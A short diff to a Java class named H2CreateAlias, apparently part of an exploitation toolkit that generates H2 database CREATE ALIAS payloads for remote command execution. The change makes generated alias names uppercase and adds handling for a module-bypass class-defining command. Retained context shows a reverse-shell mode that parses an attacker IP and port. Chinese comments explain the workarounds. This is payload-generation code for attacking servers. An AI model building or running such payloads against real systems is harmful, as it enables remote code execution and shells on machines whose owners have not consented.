@@ -10,8 +10,15 @@ public class H2CreateAlias implements ObjectPayload<Object> {
 
     @Override
     public Object getObject(String command) throws Exception {
-        String randStr = StringUtils.getRandStr(3);
+        //这里必须大写作为方法名，否则有的h2版本会报错
+        String randStr = StringUtils.getRandUppercaseStr(6);
         String cmd = null;
+
+        // bypassmodule_classloader_defineclass的情况单独处理,因为需要将类放在ClassLoader所在模块下面
+        if(command.startsWith(CommandConstant.COMMAND_BYPASSMODULE_CLASSLOADER_DEFINECLASS)){
+            command = CommandConstant.COMMAND_BYPASSMODULE_CLASSLOADER_DEFINECLASS + randStr + "|" + command.substring(CommandConstant.COMMAND_BYPASSMODULE_CLASSLOADER_DEFINECLASS.length());
+        }
+
         //ReverseShell的情况单独处理,因为Javassist的缘故new ProcessBuilder(shell)无法生成,所以没放在CommandUtils中
         if (command.startsWith(CommandConstant.COMMAND_REVERSESHELL)){
             String ipAndPort = command.substring(CommandConstant.COMMAND_REVERSESHELL.length());
